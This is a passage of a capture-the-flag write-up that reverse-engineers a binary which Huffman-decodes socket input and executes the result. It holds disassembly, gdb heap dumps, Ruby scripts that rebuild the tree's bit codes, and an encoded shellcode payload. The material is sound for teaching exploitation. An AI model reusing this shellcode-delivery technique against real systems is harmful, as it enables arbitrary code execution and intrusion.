<span class="Statement">.text</span>:<span class="Constant">004021ED</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, [<span class="Identifier">rax</span>+<span class="Identifier">entry_struct</span><span class="Statement">.histogram</span><span class="Identifier">_entry</span>]
<span class="Statement">.text</span>:<span class="Constant">004021F0</span>                 <span class="Identifier">add</span>     <span class="Identifier">edx</span>, <span class="Identifier">eax</span>

<span class="Comment">; Store the sum of the two child nodes in the new node's entry</span>
<span class="Statement">.text</span>:<span class="Constant">004021F2</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">new_entry</span>]
<span class="Statement">.text</span>:<span class="Constant">004021F6</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rax</span>+<span class="Identifier">entry_struct</span><span class="Statement">.histogram</span><span class="Identifier">_entry</span>], <span class="Identifier">edx</span>

<span class="Comment">; Store the new node at the end of the list</span>
<span class="Statement">.text</span>:<span class="Constant">00402201</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rsi</span>, <span class="Identifier">rdx</span>        <span class="Comment">; new_entry</span>
<span class="Statement">.text</span>:<span class="Constant">00402204</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rax</span>        <span class="Comment">; entry_list</span>
<span class="Statement">.text</span>:<span class="Constant">00402207</span>                 <span class="Identifier">call</span>    <span class="Identifier">add_entry_to_end_maybe</span>
```

What I could see in the code is that it removed the two smallest entries, created a new entry that points to them, and put it at the end of the list. Then it would loop until there was only one entry. Typing it like that makes it sound really obvious to me, but digging through the code was remarkably difficult. In fact, it took me a long, long time to realize that it was removing the smallest entries and adding a new entry. I totally misunderstood the code...

Anyway, let's look at an example: you have the string 'eebddaafbcdfdbaee'. The histogram looks like:

```

{"<span class="Identifier">a</span>"=><span class="Constant">3</span>, "<span class="Identifier">b</span>"=><span class="Constant">3</span>, "<span class="Identifier">c</span>"=><span class="Constant">1</span>, "<span class="Identifier">d</span>"=><span class="Constant">4</span>, "<span class="Identifier">e</span>"=><span class="Constant">4</span>, "<span class="Identifier">f</span>"=><span class="Constant">2</span>}
```

We'll re-write it, for simplicity, like this:

```

<span class="Identifier">a</span>[<span class="Constant">3</span>]  <span class="Identifier">b</span>[<span class="Constant">3</span>]  <span class="Identifier">c</span>[<span class="Constant">1</span>]  <span class="Identifier">d</span>[<span class="Constant">4</span>]  <span class="Identifier">e</span>[<span class="Constant">4</span>]  <span class="Identifier">f</span>[<span class="Constant">2</span>]
```

First, it removes the smallest two entries from the list, c\[1\] and f\[2\]:

```

<span class="Identifier">a</span>[<span class="Constant">3</span>]  <span class="Identifier">b</span>[<span class="Constant">3</span>]  <span class="Identifier">d</span>[<span class="Constant">4</span>]  <span class="Identifier">e</span>[<span class="Constant">4</span>]
```

And replaces them with another node that contains their combined value, with the two removed values underneath:

```

<span class="Identifier">a</span>[<span class="Constant">3</span>]  <span class="Identifier">b</span>[<span class="Constant">3</span>]  <span class="Identifier">d</span>[<span class="Constant">4</span>]  <span class="Identifier">e</span>[<span class="Constant">4</span>]  [<span class="Constant">3</span>]
                        / \
                     <span class="Identifier">c</span>[<span class="Constant">1</span>] <span class="Identifier">f</span>[<span class="Constant">2</span>]
```

Then the next two smallest values are removed and combined under a single parent:

```

<span class="Identifier">d</span>[<span class="Constant">4</span>]  <span class="Identifier">e</span>[<span class="Constant">4</span>]  [<span class="Constant">3</span>]       [<span class="Constant">6</span>]
            / \       / \
         <span class="Identifier">c</span>[<span class="Constant">1</span>] <span class="Identifier">f</span>[<span class="Constant">2</span>] <span class="Identifier">a</span>[<span class="Constant">3</span>] <span class="Identifier">b</span>[<span class="Constant">3</span>]
```

Then remove the smallest two again. This step is interesting because one of the smallest nodes is a non-leaf:

```

<span class="Identifier">e</span>[<span class="Constant">4</span>]   [<span class="Constant">6</span>]
       / \
    <span class="Identifier">a</span>[<span class="Constant">3</span>] <span class="Identifier">b</span>[<span class="Constant">3</span>]
```

Add them back under a common node at the end:

```

<span class="Identifier">e</span>[<span class="Constant">4</span>]   [<span class="Constant">6</span>]       [<span class="Constant">7</span>]
       / \       / \
    <span class="Identifier">a</span>[<span class="Constant">3</span>] <span class="Identifier">b</span>[<span class="Constant">3</span>]  [<span class="Constant">3</span>] <span class="Identifier">d</span>[<span class="Constant">4</span>]
               / \
             <span class="Identifier">c</span>[<span class="Constant">1</span>] <span class="Identifier">f</span>[<span class="Constant">2</span>]
```

Then the \[4\] and \[6\] are similarly combined:

```

     [<span class="Constant">10</span>]         [<span class="Constant">7</span>]
     /  \         / \
  <span class="Identifier">e</span>[<span class="Constant">4</span>]  [<span class="Constant">6</span>]     [<span class="Constant">3</span>] <span class="Identifier">d</span>[<span class="Constant">4</span>]
        / \       / \
     <span class="Identifier">a</span>[<span class="Constant">3</span>] <span class="Identifier">b</span>[<span class="Constant">3</span>]  <span class="Identifier">c</span>[<span class="Constant">1</span>] <span class="Identifier">f</span>[<span class="Constant">2</span>]
```

And finally, we only have a single parent node:

```

            [<span class="Constant">17</span>]
          /     \
     [<span class="Constant">10</span>]         [<span class="Constant">7</span>]
     /  \         / \
  <span class="Identifier">e</span>[<span class="Constant">4</span>]  [<span class="Constant">6</span>]     [<span class="Constant">3</span>] <span class="Identifier">d</span>[<span class="Constant">4</span>]
        / \      /    \
     <span class="Identifier">a</span>[<span class="Constant">3</span>] <span class="Identifier">b</span>[<span class="Constant">3</span>] <span class="Identifier">c</span>[<span class="Constant">1</span>]   <span class="Identifier">f</span>[<span class="Constant">2</span>]
```

And there you have it! A tree!

It's really funny: when I was working on this, I had the feeling at the back of my mind that this was a real tree algorithm, but I read a bunch on Wikipedia and couldn't find one that matched, so I gave up and just continued. Today, my co-worker mentioned "oh, like Huffman encoding!" and I said "nah, there's no compression involved".

But, as soon as I built that tree by hand, I realized that this absolutely IS a [Huffman Tree](http://en.wikipedia.org/wiki/Huffman_coding)! And checking Wikipedia, I can confirm that it is. That would have made the last part a whole lot easier...

## Using the incoming data

Now, what's going on with the data I send in? I already confirmed that it's a 4-byte length value followed by some code, and the program crashes in different and creative ways depending on what code I send it. Now what?

If I'd recognized the Huffman Tree, I could have made a pretty good guess: that we're sending huffman-compressed data. And it would have been right, too! Unfortunately, I missed the obvious hints...

Anyway, I don't really want to dwell too much on this part, since it's conceptually really simple. There was a loop that would go through the data string you sent it, and touch each byte you sent 8 times. Hmm. Then there was some bitwise arithmetic that would do some shifting and ANDing of each byte. You'd think I would have figured out by that that it's breaking the string into bits, but I didn't. What made the light bulb go on was this:

```

<span class="Statement">.text</span>:<span class="Constant">00401315</span>                 <span class="Identifier">and</span>     <span class="Identifier">eax</span>, <span class="Constant">1</span>
<span class="Statement">.text</span>:<span class="Constant">00401318</span>                 <span class="Identifier">test</span>    <span class="Identifier">eax</span>, <span class="Identifier">eax</span>
<span class="Statement">.text</span>:<span class="Constant">0040131A</span>                 <span class="Identifier">jz</span>      <span class="Identifier">short</span> <span class="Identifier">use_left</span>
<span class="Statement">.text</span>:<span class="Constant">0040131C</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">current_node</span>] <span class="Comment">; starts at the root</span>
<span class="Statement">.text</span>:<span class="Constant">00401320</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rax</span>+<span class="Identifier">entry_struct</span><span class="Statement">.right</span><span class="Identifier">_histogram</span>]
<span class="Statement">.text</span>:<span class="Constant">00401324</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">current_node</span>], <span class="Identifier">rax</span> <span class="Comment">; starts at the root</span>
<span class="Statement">.text</span>:<span class="Constant">00401328</span>                 <span class="Identifier">jmp</span>     <span class="Identifier">short</span> <span class="Identifier">restart_loop</span>
<span class="Statement">.text</span>:<span class="Constant">0040132A</span> <span class="Comment">; ---------------------------------------------------------------------------</span>
<span class="Statement">.text</span>:<span class="Constant">0040132A</span>
<span class="Statement">.text</span>:<span class="Constant">0040132A</span> <span class="Identifier">use_left</span>:                               <span class="Comment">; CODE XREF: walk_tree_to_get_value+9Ej</span>
<span class="Statement">.text</span>:<span class="Constant">0040132A</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">current_node</span>] <span class="Comment">; starts at the root</span>
<span class="Statement">.text</span>:<span class="Constant">0040132E</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rax</span>+<span class="Identifier">entry_struct</span><span class="Statement">.left</span><span class="Identifier">_histogram</span>]
<span class="Statement">.text</span>:<span class="Constant">00401331</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">current_node</span>], <span class="Identifier">rax</span> <span class="Comment">; starts at the root</span>
<span class="Statement">.text</span>:<span class="Constant">00401335</span>
<span class="Statement">.text</span>:<span class="Constant">00401335</span> <span class="Identifier">restart_loop</span>:                           <span class="Comment">; CODE XREF: walk_tree_to_get_value+ACj</span>
<span class="Statement">.text</span>:<span class="Constant">00401335</span>                 <span class="Identifier">add</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">current_index_maybe</span>], <span class="Constant">1</span>
```

Basically, based on the right-most bit in eax, it makes a decision to either jump to the left node or the right node. Then, when it gets to the leaf...

```

<span class="Statement">.text</span>:<span class="Constant">00401363</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">current_node</span>] <span class="Comment">; starts at the root</span>
<span class="Statement">.text</span>:<span class="Constant">00401367</span>                 <span class="Identifier">movzx</span>   <span class="Identifier">eax</span>, [<span class="Identifier">rax</span>+<span class="Identifier">entry_struct</span><span class="Statement">.byte</span><span class="Identifier">_value</span>] <span class="Comment">; Return the byte value at this leaf</span>
<span class="Statement">.text</span>:<span class="Constant">00401374</span>                 <span class="Identifier">pop</span>     <span class="Identifier">rbx</span>
<span class="Statement">.text</span>:<span class="Constant">00401375</span>                 <span class="Identifier">pop</span>     <span class="Identifier">rbp</span>
<span class="Statement">.text</span>:<span class="Constant">00401376</span>                 <span class="Identifier">retn</span>
```

...it returns the byte value in that leaf. If you read up on Huffman Trees, you'll see that that's exactly how they work.

The calling function adds that byte value to the end of an executable memory segment. When we're done reading the tree, the list of leaf-node bytes we've found are executed.

To summarize:

- Build a histogram from itself
- Convert that histogram into a Huffman Tree
- Read data from the socket
- Convert that data to bits, and use those bits to navigate the tree

We're almost done but... how do we get that tree!?

## Putting it all together

All right, we understand the code, now we have to write an exploit. What do we do!?

The "right" way to do this is to build the same tree the same way, and to walk it from the node to the root to get he values. But this is a CTF and I want it to work on the first try, damnit! None of that "reconstructing the exact algorithm" nonsense! So I decided to steal their memory. :)

So, the first thing I did was put a breakpoint immediately after the tree was built to find the address of the root. On my box, the address of the root node, after the tree was built, happened to be 0x60e050. Then I wanted to dump the heap:

```

<span class="Statement">(</span>gdb<span class="Statement">)</span> x<span class="Normal">/</span><span class="Constant">1000000</span>xb <span class="Constant">0x603000</span>
<span class="Statement">0x603000</span><span class="Normal">:</span>       <span class="Constant">0x1b</span>    <span class="Constant">0x0c</span>    <span class="Constant">0x07</span>    <span class="Constant">0x08</span>    <span class="Constant">0x90</span>    <span class="Constant">0x01</span>    <span class="Constant">0x07</span>    <span class="Constant">0x10</span>
<span class="Statement">0x603008</span><span class="Normal">:</span>       <span class="Constant">0x14</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x1c</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>
<span class="Statement">0x603010</span><span class="Normal">:</span>       <span class="Constant">0x80</span>    <span class="Constant">0xe1</span>    <span class="Constant">0xff</span>    <span class="Constant">0xff</span>    <span class="Constant">0x2a</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>
<span class="Statement">0x603018</span><span class="Normal">:</span>       <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>
<span class="Statement">0x603020</span><span class="Normal">:</span>       <span class="Constant">0x14</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>    <span class="Constant">0x00</span>
<span class="PreProc">[...]</span>
```

I determined the starting address by trial and error - I wanted it to be as small as possible, but I needed the memory between it and the root node to be contiguous. 0x602000 wasn't allocated, but 0x603000 worked fine.

I dumped that to a file from gdb, then processed the file with Ruby:

```

<span class="Comment"># Split the file into lines</span>
file.split(<span class="Special">/</span><span class="Special">\n</span><span class="Special">/</span>).each <span class="Statement">do</span> |<span class="Identifier">line</span>|
  <span class="Statement">if</span>(line =~ <span class="Special">/</span><span class="Constant">Cannot</span><span class="Special">/</span>)
    <span class="Statement">break</span>
  <span class="Statement">end</span>

  <span class="Comment"># Break off the address and data</span>
  addr, data = line.split(<span class="Special">/</span><span class="Constant">:</span><span class="Special">\s</span><span class="Special">/</span>, <span class="Constant">2</span>)
  addr = addr.to_i(<span class="Constant">16</span>)

  <span class="Comment"># Remove the crud</span>
  data.gsub!(<span class="Special">/</span><span class="Constant">0x</span><span class="Special">/</span>, <span class="Special">''</span>)
  data.gsub!(<span class="Special">/</span><span class="Special">[^</span><span class="Constant">a-fA-F0-9</span><span class="Special">]</span><span class="Special">/</span>, <span class="Special">''</span>)

  <span class="Comment"># Get both the qword (64-bit value) and pair of dwords (32-bit values) on that line</span>
  qword = [data].pack(<span class="Special">"</span><span class="Constant">H*</span><span class="Special">"</span>).unpack(<span class="Special">"</span><span class="Constant">Q</span><span class="Special">"</span>).pop
  dword1 = qword & <span class="Constant">0x0FFFFFFFF</span>
  dword2 = (qword >> <span class="Constant">32</span>) & <span class="Constant">0x0FFFFFFFF</span>

  <span class="Comment"># Store them, indexed by the address</span>
  <span class="Identifier">@@qwords</span>[addr] = qword
  <span class="Identifier">@@dwords</span>[addr] = dword1
  <span class="Identifier">@@dwords</span>[addr+<span class="Constant">4</span>] = dword2
<span class="Statement">end</span>
```

Now I have a nice address->value mapping for the entire dumped memory. So I can now define a function to read a node:

```

<span class="rubyDefine">def</span> <span class="Identifier">get_node</span>(addr)
  node = {}
  node[<span class="Constant">:addr</span>]  = addr
  node[<span class="Constant">:left</span>]  = <span class="Identifier">@@qwords</span>[addr + <span class="Constant">0x00</span>]
  node[<span class="Constant">:right</span>] = <span class="Identifier">@@qwords</span>[addr + <span class="Constant">0x08</span>]
  node[<span class="Constant">:value</span>] = <span class="Identifier">@@dwords</span>[addr + <span class="Constant">0x10</span>]
  node[<span class="Constant">:count</span>] = <span class="Identifier">@@dwords</span>[addr + <span class="Constant">0x1c</span>]

  <span class="Statement">return</span> node
<span class="rubyDefine">end</span>
```

And, starting at the root, re-build the whole tree recursively:

```

<span class="Identifier">@@seqs</span> = {}
<span class="rubyDefine">def</span> <span class="Identifier">walk_nodes</span>(addr, seq = <span class="Special">""</span>)
  node = get_node(addr)
  <span class="Comment">#print_node(node)</span>

  <span class="Statement">if</span>(node[<span class="Constant">:left</span>] != <span class="Constant">0</span>)
    walk_nodes(node[<span class="Constant">:left</span>], seq + <span class="Special">"</span><span class="Constant">0</span><span class="Special">"</span>)
  <span class="Statement">end</span>

  <span class="Statement">if</span>(node[<span class="Constant">:right</span>] != <span class="Constant">0</span>)
    walk_nodes(node[<span class="Constant">:right</span>], seq + <span class="Special">"</span><span class="Constant">1</span><span class="Special">"</span>)
  <span class="Statement">end</span>

  <span class="Statement">if</span>(node[<span class="Constant">:left</span>] == <span class="Constant">0</span>)
    <span class="Identifier">@@seqs</span>[node[<span class="Constant">:value</span>]] = seq
  <span class="Statement">end</span>
<span class="rubyDefine">end</span>

node = get_node(<span class="Type">ROOT</span>)
walk_nodes(<span class="Type">ROOT</span>)
```

In the end, @@seqs looks like this:

```

<span class="Statement">0</span> <span class="Normal">=</span>> <span class="Constant">0</span>
<span class="Statement">255</span> <span class="Normal">=</span>> <span class="Constant">1000</span>
<span class="Statement">215</span> <span class="Normal">=</span>> <span class="Constant">100100000000</span>
<span class="Statement">177</span> <span class="Normal">=</span>> <span class="Constant">100100000001</span>
<span class="Statement">30</span> <span class="Normal">=</span>> <span class="Constant">10010000001</span>
<span class="Statement">56</span> <span class="Normal">=</span>> <span class="Constant">1001000001</span>
<span class="Statement">220</span> <span class="Normal">=</span>> <span class="Constant">100100001</span>
<span class="Statement">114</span> <span class="Normal">=</span>> <span class="Constant">10010001</span>
<span class="Statement">7</span> <span class="Normal">=</span>> <span class="Constant">1001001</span>
<span class="Statement">133</span> <span class="Normal">=</span>> <span class="Constant">10010100</span>
<span class="Statement">97</span> <span class="Normal">=</span>> <span class="Constant">10010101</span>
...
```

Now that I have a mapping, I can do a bunch of lookups for the shellcode of my choice:

```

tree_code = <span class="Special">""</span>

<span class="Type">SHELLCODE</span>.split(<span class="Special">//</span>).each <span class="Statement">do</span> |<span class="Identifier">c</span>|
  tree_code += <span class="Identifier">@@seqs</span>[c.ord]
<span class="Statement">end</span>

<span class="Statement">while</span>((tree_code.length % <span class="Constant">8</span>) != <span class="Constant">0</span>) <span class="Statement">do</span>
  tree_code += <span class="Special">'</span><span class="Constant">0</span><span class="Special">'</span>
<span class="Statement">end</span>
tree_code = [tree_code].pack(<span class="Special">"</span><span class="Constant">B*</span><span class="Special">"</span>)
tree_code = [tree_code.length].pack(<span class="Special">"</span><span class="Constant">I</span><span class="Special">"</span>) + tree_code
tree_code.split(<span class="Special">//</span>).each <span class="Statement">do</span> |<span class="Identifier">b</span>|
  print(<span class="Special">'</span><span class="Constant">\x%02x</span><span class="Special">'</span> % b.ord)
<span class="Statement">end</span>
puts()
```

And I'm done! I have a compressed version of my shellcode that I can feed directly into the program:

<tt>\\x89\\x00\\x00\\x00\\xd7\\x5f\\x67\\xae\\xbe\\x35\\xd7\\xdf\\x0d\\x75\\xfe\\x09\\x7d\\x75\\xf6\\x75\\x13\\xba\\xc3\\x51\\x33\\xd4\\x55\\x44\\xfc\\xea\\x91\\x51\\x3d\\x0d\\x83\\xc3\\xf5\\xd1\\x7e\\xd9\\xeb\\xaf\\xbe\\x17\\xd7\\x5f\\xe0\\x98\\xb3\\x7f\\x0f\\x8e\\xab\\xbb\\x2d\\x9a\\xfb\\xaa\\xee\\xea\\x0c\\xfc\\xd7\\xdd\\x57\\xc7\\xd5\\x48\\x7e\\x9e\\x03\\xaf\\x6c\\x0a\\x89\\xe2\\xaa\\x46\\x2d\\x76\\xc3\\x51\\x35\\x36\\xc1\\xe1\\xfa\\xf5\\xd7\\xdf\\x0a\\x89\\xc0\\xa8\\xad\\x47\\x55\\x51\\x33\\x16\\xc1\\xe1\\xfa\\xf9\\x6f\\x86\\xba\\xf8\\xae\\x22\\xb8\\x8a\\x8a\\xaa\\x46\\xb0\\x7c\\x0b\\x81\\x6d\\x39\\xfe\\x5e\\x05\\x47\\x57\\xad\\xf3\\x20\\x78\\xeb\\x88\\xdf\\x6c\\x35\\x13\\xc0\\x6c\\x1e\\x1f\\xac</tt>

Conclusion: my 118 bytes of shellcode compresses down to a clean 142 bytes. :)

## Summary

So, once you figure it out, this level is actually pretty straight forward!

Basically, read its own binary, build a Huffman Tree, then use the user's input to walk that Huffman Tree to build the executable code to run. Or, in other words, decompress and run the shellcode that we send!